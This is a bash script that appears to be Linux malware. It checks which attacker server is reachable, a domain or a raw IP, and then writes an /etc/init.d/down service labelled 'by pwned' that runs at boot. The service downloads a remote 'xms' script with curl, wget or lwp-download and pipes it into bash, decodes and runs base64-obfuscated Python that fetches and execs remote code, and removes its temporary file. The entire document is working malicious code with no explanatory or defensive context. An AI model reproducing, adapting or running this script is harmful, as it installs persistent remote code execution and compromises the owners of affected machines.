#!/bin/bash

if [ $(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
        url="bash.givemexyz.in"
        base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn"
else
        url="198.98.57.217"
        base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xOTguOTguNTcuMjE3L2QucHkiKS5yZWFkKCkpJw=="
fi

echo -e '#!/bin/bash
### BEGIN INIT INFO
# Provides:          down
# Required-Start:
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: down (by pwned)
### END INIT INFO
(curl -fsSL http://$url/xms||wget -q -O- http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms' > /etc/init.d/down